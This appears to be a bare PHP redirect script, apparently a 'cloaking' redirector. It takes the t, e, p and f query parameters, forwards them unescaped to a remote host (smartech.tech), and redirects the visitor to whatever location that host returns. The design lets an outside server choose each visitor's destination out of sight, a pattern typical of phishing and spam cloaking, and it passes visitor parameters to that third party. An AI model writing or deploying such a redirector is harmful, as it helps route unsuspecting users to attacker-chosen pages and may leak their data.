


 $url = $_SERVER['REQUEST_URI'];
$url_components = parse_url($url);
parse_str($url_components['query'], $params);
$cloakjson = file_get_contents('http://smartech.tech/json/'.$params['t'].'?e='.$params['e'].'&p='.$params['p'].'&f='.$params['f'].'');
$cloakjsons = json_decode($cloakjson, true);
header("Location: ".$cloakjsons);
?>
